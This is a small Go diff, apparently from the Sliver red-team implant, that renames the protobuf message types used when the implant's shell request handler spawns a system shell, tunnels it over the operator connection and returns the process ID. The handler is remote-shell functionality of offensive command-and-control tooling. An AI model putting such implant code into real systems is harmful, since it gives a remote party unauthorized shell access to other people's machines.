@@ -100,7 +100,7 @@ func (t tunnelWriter) Write(data []byte) (n int, err error) {
 
 func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
-	shellReq := &sliverpb.ShellReq{}
+	shellReq := &sliverpb.ShellTunnel{}
 	err := proto.Unmarshal(envelope.Data, shellReq)
 	if err != nil {
 		return
@@ -124,13 +124,12 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}
 	connection.AddTunnel(tunnel)
 
-	shellResp, _ := proto.Marshal(&sliverpb.Shell{
-		Success: true,
-		Pid:     uint32(systemShell.Command.Process.Pid),
+	shellTun, _ := proto.Marshal(&sliverpb.ShellTunnel{
+		Pid: uint32(systemShell.Command.Process.Pid),
 	})
 	connection.Send <- &sliverpb.Envelope{
 		ID:   envelope.ID,
-		Data: shellResp,
+		Data: shellTun,
 	}
 
 	// Cleanup function with arguments
